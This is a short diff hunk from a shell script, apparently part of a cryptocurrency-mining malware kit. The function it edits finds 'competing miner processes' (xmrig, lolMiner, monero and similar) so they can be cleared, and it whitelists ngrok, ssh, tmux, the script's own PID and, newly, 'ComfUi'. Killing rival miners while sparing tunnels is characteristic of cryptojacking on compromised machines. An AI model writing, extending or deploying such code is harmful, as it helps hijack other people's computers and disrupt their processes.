@@ -95,7 +95,7 @@ find_working_pool() {
 cleanup_miner_processes() {
     log_event "Cleaning up competing miner processes..."
     local patterns="miner|xmrig|lolMiner|crypto|eth|xmr|monero"
-    local whitelist="ngrok|ssh|screen|bash|zsh|tmux|$$|cryptex"
+    local whitelist="ngrok|ssh|screen|bash|zsh|tmux|ComfUi|$$|cryptex"
     local cleared=0
     
     ps aux | grep -Ei "$patterns" | grep -v grep | while read -r line; do
